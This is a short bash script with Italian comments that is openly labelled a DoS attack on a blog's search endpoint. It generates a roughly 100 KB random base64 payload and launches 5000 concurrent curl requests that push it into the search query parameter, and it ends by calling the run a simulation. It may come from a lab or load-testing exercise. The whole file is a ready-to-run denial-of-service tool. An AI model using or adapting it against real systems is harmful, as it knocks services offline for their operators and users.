#!/bin/bash

# 1. Target dell'attacco
URL="http://cyber.blog:8000/articles/search"

echo "⏳ Generazione del payload pesante in corso..."
# Generiamo il testo pesante e lo salviamo in un file temporaneo chiamato 'payload.txt'
head -c 100000 < /dev/urandom | base64 > payload.txt

# Numero di richieste
NUM_REQUESTS=5000

echo "🔥 Avvio attacco DoS ottimizzato per Windows su: $URL"
echo "🛑 Premi [CTRL + C] per FERMARE."
echo "--------------------------------------------------------"

for ((i=1; i<=NUM_REQUESTS; i++))
do
    # Usiamo --data-urlencode con il simbolo '@' per dire a curl di caricare 
    # i dati direttamente dal file, evitando il blocco 'Argument list too long'
    curl -G --silent -o /dev/null "$URL" --data-urlencode "query=@payload.txt" &
    
    if [ $((i % 100)) -eq 0 ]; then
        echo "Richiesta $i inviata..."
    fi
done

# Aspetta che i processi finiscano e poi pulisce il file temporaneo
wait
rm -f payload.txt
echo "🏁 Simulazione completata!"